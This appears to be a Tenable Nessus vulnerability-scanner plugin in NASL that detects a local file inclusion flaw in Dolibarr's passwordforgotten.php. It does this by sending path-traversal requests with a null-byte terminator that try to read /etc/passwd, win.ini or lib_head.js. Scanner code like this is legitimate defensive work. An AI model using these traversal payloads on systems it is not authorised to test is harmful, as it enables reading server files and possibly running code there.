#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(58746);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_bugtraq_id(47542);
  script_osvdb_id(72129);
  script_xref(name:"EDB-ID", value:"17202");

  script_name(english:"Dolibarr passwordforgotten.php theme Parameter Local File Inclusion");
  script_summary(english:"Tries to exploit an LFI flaw in Dolibarr");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is affected by a
local file inclusion vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Dolibarr installed on the remote host fails to
sanitize user-supplied input to the 'theme' parameter of the
'user/passwordforgotten.php' script before using it to include PHP
code.

Using a specially crafted request, a remote, unauthenticated attacker
may be able to leverage this vulnerability to read arbitrary files or
execute arbitrary PHP code from the affected host, subject to the
privileges under which the web server operates."
  );
  script_set_attribute(attribute:"see_also", value:"http://autosectools.com/Advisory/Dolibarr-3.0.0-Local-File-Inclusion-181");
  script_set_attribute(
    attribute:"solution",
    value:
"There is currently no known solution.  Edit the source code manually
to ensure that input is properly sanitized."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Dolibarr 3.0.0 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/04/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/04/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dolibarr:dolibarr");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "dolibarr_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/dolibarr");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE, embedded:0);

install = get_install_from_kb(appname:'dolibarr', port:port, exit_on_fail:TRUE);

os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini', '/winnt/win.ini');
  else files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/winnt/win.ini', '/windows/win.ini');

dir = install['dir'];

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
# look for section tags in win.ini
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

vuln_script = '/user/passwordforgotten.php';
vuln_param = 'theme';

traversal = mult_str(str:"../", nb:12) + '..';

foreach file (files)
{
  exploit_url = dir + vuln_script + '?' + vuln_param + '=' + traversal + file + '%00';

  res = http_send_recv3(method:"GET",item:exploit_url, port:port, exit_on_fail:TRUE);

  error_returned = FALSE;
  if (
    file + "): failed to open stream: Permission denied" >< res[2] ||
    file + ") [function.include]: failed to open stream: Permission denied" >< res[2] ||
    file + ") [<a href='function.include'>function.include</a>]: failed to open stream: Permission denied" >< res[2] ||

    #openbasedir
    file+") [function.require_once]: failed to open stream: Operation not permitted" >< res[2] ||
    file+") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: Operation not permitted" >< res[2] ||
    (
      "open_basedir restriction in effect. File(" >< res[2] &&
      file + ") is not within the allowed path"
    )
  ) error_returned = TRUE;

  pat = file_pats[file];
  if (res[2] =~ pat || error_returned)
  {
    if (report_verbosity > 0)
    {
      if(error_returned)
      {
        report =  '\n' + 'Nessus was not able to exploit the issue, but was able to verify it';
        report += '\n' + 'exists by examining the error message returned from the following';
        report += '\n' + 'request:' + '\n\n';
      }
      else
      {
        report = '\n' + 'Nessus was able to exploit the issue and retrieve the contents of';
        report += '\n' + file + ' with the following request:' + '\n\n';
      }
      report += build_url(qs:exploit_url, port:port) + '\n';
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}

# backup file
file = '../lib/lib_head.js';
exploit_url = dir + vuln_script + '?' + vuln_param + '=' + file + '%00';

res = http_send_recv3(method:"GET",item:exploit_url, port:port, exit_on_fail:TRUE);
error_returned = FALSE;

if(
  file + "): failed to open stream: Permission denied" >< res[2] ||
  file + ") [function.include]: failed to open stream: Permission denied" >< res[2] ||
  file + ") [<a href='function.include'>function.include</a>]: failed to open stream: Permission denied" >< res[2]
) error_returned = TRUE;

if (
  (
    "Laurent Destailleur" >< res[2] &&
    "Regis Houssin" >< res[2] &&
    "lib_head.js" >< res[2]
  ) ||
  error_returned
)
{
  if (report_verbosity > 0)
  {
    if(error_returned)
    {
      report =  '\nNessus was not able to exploit the issue, but was able to verify it';
      report += '\nexists by examining the error message returned from the following';
      report += '\nrequest:\n\n';
    }
    else
    {
      report = '\nNessus was able to exploit the issue and retrieve the contents of';
      report += '\n"lib_head.js" with the following request:\n\n';
    }
    report += build_url(qs:exploit_url, port:port) + '\n';
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else exit(0, 'The Dolibarr install at ' + build_url(qs:dir, port:port) + ' is not affected.');
